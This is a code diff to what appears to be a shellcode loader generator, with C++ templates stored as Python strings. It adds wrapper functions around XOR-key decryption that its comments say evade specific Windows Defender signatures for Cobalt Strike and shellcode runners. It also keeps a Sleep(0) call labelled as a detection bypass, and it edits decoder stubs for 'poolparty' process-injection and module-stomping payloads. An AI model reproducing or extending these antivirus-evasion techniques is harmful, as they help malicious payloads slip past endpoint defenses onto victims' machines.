@@ -84,10 +84,17 @@ unsigned char* decoded = (unsigned char*)malloc(payload_len);
 """
 
 regularDecode = """
+// This function will prevent the following WD static detection: Trojan:Win64/CobaltStrike.CJ!MTB
+std::string keySigBypass() {
+    std::string key;
+    key = skCrypt("REPLACE_ME_KEY");
+    return key;
+}
+
 int deC(unsigned char payload[])
 {
     std::string key;
-    key = skCrypt("REPLACE_ME_KEY");
+    key = keySigBypass();
     for (int i = 0; i < payload_len; i++)
     {
         Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
@@ -123,16 +130,14 @@ int deC()
 safePrint = """
 int safe_print(auto msg)
 {
-    printf(msg);
-    printf("\\n");
+    printf("%s\\n", msg.decrypt());
     msg.clear();
     return 0;
 }
 
 int safe_print(auto msg, NTSTATUS res)
 {
-    printf(msg);
-    printf("0x%x\\n", res);
+    printf("%s0x%x\\n", msg.decrypt(), res);
     msg.clear();
     return 0;
 }
@@ -2059,10 +2064,17 @@ poolparty_varient7_stub = """
 """
 
 pool_party_module_stomping_shim_xor_decoder = """
+// This function will prevent the following WD static detection: Trojan:Win64/CobaltStrike.CJ!MTB
+std::string keySigBypass2() {
+    std::string key;
+    key = skCrypt("REPLACE_ME_KEY");
+    return key;
+}
+
 int decodeShim(unsigned char encodedShim[], SIZE_T size)
 {
     std::string key;
-    key = skCrypt("REPLACE_ME_KEY");
+    key = keySigBypass2();
     for (int i = 0; i < size; i++)
     {
         Sleep(0); // Bypass WD "Trojan:Win64/ShellcodeRunner.AMMA!MTB" signature
